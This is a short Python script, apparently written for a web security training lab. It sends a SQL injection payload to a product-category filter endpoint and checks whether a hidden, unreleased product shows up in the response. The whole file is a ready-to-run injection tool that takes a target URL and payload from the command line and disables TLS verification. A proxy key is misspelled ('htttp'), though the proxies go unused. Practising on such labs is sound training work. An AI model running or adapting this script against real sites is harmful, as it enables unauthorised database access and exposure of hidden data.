import requests
import sys
import urllib3

proxies = {"htttp":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}
# proxies to work with burp suite

def exploit_sqli(url, payload):
	uri = '/filter?category='
	r = requests.get(url + uri + payload, verify=False)
	# you can include proxies at the end,
	# potato theatre is a product that is not yet released
	if 'Potato Theater' in r.text:
		return True

	else:
		return False

if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
		print(f"[-] Example: {sys.argv[0]} www.example.com '1=1'")
		sys.exit(-1)
	if exploit_sqli(url, payload):
		print("[+] SQL Injection Successful!")
	else:
		print("[-] SQL Injection Unsuccessful!")
